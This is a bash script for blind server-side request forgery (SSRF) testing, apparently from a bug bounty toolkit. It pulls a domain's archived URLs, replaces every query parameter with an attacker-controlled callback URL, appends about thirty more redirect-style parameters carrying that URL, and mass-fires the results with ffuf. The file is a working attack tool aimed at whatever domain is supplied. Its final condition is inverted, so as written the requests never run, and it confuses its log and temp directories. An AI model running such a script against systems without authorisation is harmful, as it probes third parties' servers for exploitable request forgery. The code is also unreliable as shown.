#echo "Blind SSRF testing - append to parameters and add new parameters @hussein98d"
#echo "Usage: bash script.sh domain.com http://server-callbak"
#echo "This script uses https://github.com/ffuf/ffuf, https://github.com/lc/gau, https://github.com/tomnomnom/waybackurls"
# $1 is domain, $2 is the callback URL (server address), $3 is the logdir, $4 is the tmpdir
if [ -z "$1" ]; then
  echo >&2 "ERROR: Domain not set"
  exit 2
fi
if [ -z "$2" ]; then
  echo >&2 "ERROR: Sever link not set"
  exit 2
fi
echo "Getting WaybackURLS"
waybackurls $1 > "$4/$1-ssrf.txt"
echo "Getting URLS with GAU"
gau $1 >> "$4/$1-ssrf.txt"
echo "Putting them all together.."
cat "$4/$1-ssrf.txt" | sort | uniq | grep "?" | qsreplace -a | qsreplace $2 > "$4/$1-ssrf-pl.txt"
sed -i "s|$|\&dest=$2\&redirect=$2\&uri=$2\&path=$2\&continue=$2\&url=$2\&window=$2\&next=$2\&data=$2\&reference=$2\&site=$2\&html=$2\&val=$2\&validate=$2\&domain=$2\&callback=$2\&return=$2\&page=$2\&feed=$2\&host=$2\&port=$2\&to=$2\&out=$2\&view=$2\&dir=$2\&show=$2\&navigation=$2\&open=$2|g" "$4/$1-ssrf-pl.txt"
python3 /root/Bug_Bounty/tools/cleanWaybackUrls/clean.py "$4/$1-ssrf-pl.txt"
echo "Firing the requests - check your server for potential callbacks"
python3 /root/Bug_Bounty/tools/RR/utility/ssrf_uniq.py "$4/$1-ssrf-pl.txt" "$1" "$3/$1-unique-pl.txt"

if [ -z "$3/$1-ssrf-pl.txt" ]; then
    ffuf -s -w "$3/$1-unique-pl.txt" -u FUZZ -t 50
else
    echo "No payloads found for $1"
fi
